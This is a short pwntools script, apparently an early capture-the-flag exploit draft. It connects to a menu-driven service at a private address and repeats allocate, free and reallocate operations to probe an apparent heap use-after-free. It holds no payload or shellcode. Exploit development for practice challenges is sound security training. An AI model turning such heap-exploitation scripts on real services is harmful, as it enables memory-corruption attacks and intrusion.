from pwn import *

s = remote('10.1.1.10',1234)
def add_video(size,dat1,dat2,dat3):
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil(':')
	s.sendline(str(size))
	time.sleep(0.1)
	s.send(dat1)
	time.sleep(0.1)
	s.send(dat2)
	time.sleep(0.1)
	s.send(dat3)
def add_sub(size,dat1):
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil('>')
	s.sendline('3')
	s.recvuntil(':')
	s.sendline(str(size))
	time.sleep(0.1)
	s.send(dat1)
def del_sub(index):
	s.recvuntil('>')
	s.sendline('2')
	s.recvuntil(')')
	s.sendline(str(index))

add_video(0x100,"\x00","\x00","\x00")
del_sub(0)
add_sub(0x100,"A")

#del_sub(1)
#add_sub(0x100,"A")
s.interactive()
